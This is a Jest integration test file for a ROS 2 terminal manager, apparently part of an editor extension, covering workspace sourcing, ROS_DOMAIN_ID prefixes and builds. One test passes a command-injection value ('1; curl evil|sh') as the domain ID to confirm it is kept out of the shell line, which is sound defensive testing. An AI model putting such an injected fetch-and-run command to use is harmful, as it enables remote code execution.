import * as path from 'path';
import { TerminalManager } from '../../executor/terminal-manager';
import { WorkspaceInfo } from '../../core/workspace-detector';

const FIXTURES_ROOT = path.resolve(__dirname, '../../../test-fixtures');

describe('TerminalManager Integration Tests', () => {
  let terminalManager: TerminalManager;

  beforeEach(() => {
    terminalManager = new TerminalManager();
  });

  afterEach(() => {
    terminalManager.dispose();
  });

  describe('sourceWorkspace', () => {
    it('handle missing install folder', async () => {
      const workspace: WorkspaceInfo = {
        id: '/no-install-ws',
        name: 'no-install',
        rootPath: { fsPath: '/no-install-ws' } as any,
        srcPath: { fsPath: '/no-install-ws/src' } as any,
        installPath: null,
        buildPath: null,
        rosDistribution: null,
        isValid: true,
        errors: [],
        warnings: []
      };

      // Should show warning and not throw
      await expect(terminalManager.sourceWorkspace(workspace)).resolves.not.toThrow();
    });

    it('handle missing setup.bash', async () => {
      const workspace: WorkspaceInfo = {
        id: '/fake-ws',
        name: 'fake',
        rootPath: { fsPath: '/fake-ws' } as any,
        srcPath: null,
        installPath: { fsPath: '/fake-ws/install' } as any,
        buildPath: null,
        rosDistribution: null,
        isValid: true,
        errors: [],
        warnings: []
      };

      // Should show warning and not throw
      await expect(terminalManager.sourceWorkspace(workspace)).resolves.not.toThrow();
    });

    it('source existing workspace', async () => {
      const validWorkspacePath = path.join(FIXTURES_ROOT, 'workspace-valid');
      
      const workspace: WorkspaceInfo = {
        id: validWorkspacePath,
        name: 'workspace-valid',
        rootPath: { fsPath: validWorkspacePath } as any,
        srcPath: { fsPath: path.join(validWorkspacePath, 'src') } as any,
        installPath: { fsPath: path.join(validWorkspacePath, 'install') } as any,
        buildPath: null,
        rosDistribution: null,
        isValid: true,
        errors: [],
        warnings: []
      };

      // This would normally create a terminal, but in test environment
      // we just verify it doesn't throw
      await expect(terminalManager.sourceWorkspace(workspace)).resolves.not.toThrow();
    });
  });

  describe('resolveSetupBash fallback', () => {
    it('sources via rootPath/install when installPath is stale null', async () => {
      const validWorkspacePath = path.join(FIXTURES_ROOT, 'workspace-valid');

      const staleWorkspace: WorkspaceInfo = {
        id: validWorkspacePath,
        name: 'workspace-valid',
        rootPath: { fsPath: validWorkspacePath } as any,
        srcPath: { fsPath: path.join(validWorkspacePath, 'src') } as any,
        installPath: null,
        buildPath: null,
        rosDistribution: null,
        isValid: true,
        errors: [],
        warnings: []
      };

      const terminal = await terminalManager.executeInNewTerminal(
        'ros2 run my_pkg my_node',
        staleWorkspace,
        'Stale Run'
      );

      const sentCommands = (terminal.sendText as jest.Mock).mock.calls.map(call => call[0]);
      const expectedSetup = path.join(validWorkspacePath, 'install', 'setup.bash');
      expect(sentCommands.some(cmd => cmd.startsWith(`source "${expectedSetup}"`))).toBe(true);
    });

    it('does not source when no setup.bash exists anywhere', async () => {
      const staleWorkspace: WorkspaceInfo = {
        id: '/no-install-ws',
        name: 'no-install',
        rootPath: { fsPath: '/no-install-ws' } as any,
        srcPath: { fsPath: '/no-install-ws/src' } as any,
        installPath: null,
        buildPath: null,
        rosDistribution: null,
        isValid: true,
        errors: [],
        warnings: []
      };

      const terminal = await terminalManager.executeInNewTerminal(
        'ros2 run my_pkg my_node',
        staleWorkspace,
        'Bare Run'
      );

      const sentCommands = (terminal.sendText as jest.Mock).mock.calls.map(call => call[0]);
      expect(sentCommands).toEqual(['ros2 run my_pkg my_node']);
    });
  });

  describe('executeInTerminal', () => {
    it('terminal creation and tracking', async () => {
      const workspace: WorkspaceInfo = {
        id: '/test-ws',
        name: 'test',
        rootPath: { fsPath: '/test-ws' } as any,
        srcPath: null,
        installPath: null,
        buildPath: null,
        rosDistribution: null,
        isValid: true,
        errors: [],
        warnings: []
      };

      const terminal = await terminalManager.executeInTerminal('echo "test"', workspace);

      expect(terminal).toBeDefined();
      expect(terminal.name).toBe('ROS: test');
    });

    describe('ROS_DOMAIN_ID terminal prefix', () => {
      const workspace: WorkspaceInfo = {
        id: '/test-ws',
        name: 'test',
        rootPath: { fsPath: '/test-ws' } as any,
        srcPath: null,
        installPath: null,
        buildPath: null,
        rosDistribution: null,
        isValid: true,
        errors: [],
        warnings: []
      };

      afterEach(() => {
        terminalManager.setDomainId(undefined);
      });

      it('prepends export ROS_DOMAIN_ID when a domain is set', async () => {
        terminalManager.setDomainId(3);
        const terminal = await terminalManager.executeInNewTerminal('rviz2', workspace, 'RVIZ2');
        const sent = (terminal.sendText as jest.Mock).mock.calls.map(call => call[0]).join('\n');
        expect(sent).toContain('export ROS_DOMAIN_ID=3 &&');
      });

      it('keeps the export across sourcing: source first, then export, then command', async () => {
        const validWorkspacePath = path.join(FIXTURES_ROOT, 'workspace-valid');
        const validWs: WorkspaceInfo = {
          ...workspace,
          rootPath: { fsPath: validWorkspacePath } as any,
          installPath: { fsPath: path.join(validWorkspacePath, 'install') } as any
        };
        terminalManager.setDomainId(2);
        const terminal = await terminalManager.executeInNewTerminal('rviz2', validWs, 'RVIZ2');
        const sent = (terminal.sendText as jest.Mock).mock.calls.map(call => call[0]).join('\n');
        expect(sent).toMatch(/^source ".+" && export ROS_DOMAIN_ID=2 && rviz2$/m);
      });

      it('sends the plain command when no domain is set', async () => {
        terminalManager.setDomainId(undefined);
        const terminal = await terminalManager.executeInNewTerminal('rviz2', workspace, 'RVIZ2');
        const sent = (terminal.sendText as jest.Mock).mock.calls.map(call => call[0]).join('\n');
        expect(sent).not.toContain('ROS_DOMAIN_ID');
        expect(sent).toContain('rviz2');
      });

      it('options.domainId overrides the global domain for this terminal', async () => {
        terminalManager.setDomainId(1);
        const terminal = await terminalManager.executeInNewTerminal('rviz2', workspace, 'RVIZ2', { domainId: 5 });
        const sent = (terminal.sendText as jest.Mock).mock.calls.map(call => call[0]).join('\n');
        expect(sent).toContain('export ROS_DOMAIN_ID=5 &&');
        expect(sent).not.toContain('ROS_DOMAIN_ID=1');
        terminalManager.setDomainId(undefined);
      });

      it('options.domainId undefined falls back to the global domain', async () => {
        terminalManager.setDomainId(1);
        const terminal = await terminalManager.executeInNewTerminal('rviz2', workspace, 'RVIZ2', { source: true });
        const sent = (terminal.sendText as jest.Mock).mock.calls.map(call => call[0]).join('\n');
        expect(sent).toContain('export ROS_DOMAIN_ID=1 &&');
        terminalManager.setDomainId(undefined);
      });

      it('ignores non-integer domains instead of writing them into the shell line', async () => {
        const hostile = '1; curl evil|sh' as unknown as number;
        terminalManager.setDomainId(hostile);
        const terminal = await terminalManager.executeInNewTerminal('rviz2', workspace, 'RVIZ2');
        const sent = (terminal.sendText as jest.Mock).mock.calls.map(call => call[0]).join('\n');
        expect(sent).not.toContain('ROS_DOMAIN_ID');
        expect(sent).toContain('rviz2');
      });
    });

    it('build command execution', async () => {
      const validWorkspacePath = path.join(FIXTURES_ROOT, 'workspace-valid');
      
      const workspace: WorkspaceInfo = {
        id: validWorkspacePath,
        name: 'workspace-valid',
        rootPath: { fsPath: validWorkspacePath } as any,
        srcPath: { fsPath: path.join(validWorkspacePath, 'src') } as any,
        installPath: { fsPath: path.join(validWorkspacePath, 'install') } as any,
        buildPath: null,
        rosDistribution: null,
        isValid: true,
        errors: [],
        warnings: []
      };

      const terminal = await terminalManager.buildWorkspace(workspace);

      expect(terminal).toBeDefined();
    });

    it('build specific package', async () => {
      const validWorkspacePath = path.join(FIXTURES_ROOT, 'workspace-valid');
      
      const workspace: WorkspaceInfo = {
        id: validWorkspacePath,
        name: 'workspace-valid',
        rootPath: { fsPath: validWorkspacePath } as any,
        srcPath: { fsPath: path.join(validWorkspacePath, 'src') } as any,
        installPath: { fsPath: path.join(validWorkspacePath, 'install') } as any,
        buildPath: null,
        rosDistribution: null,
        isValid: true,
        errors: [],
        warnings: []
      };

      const terminal = await terminalManager.buildWorkspace(workspace, { packageName: 'my_package' });

      expect(terminal).toBeDefined();
    });
  });
});
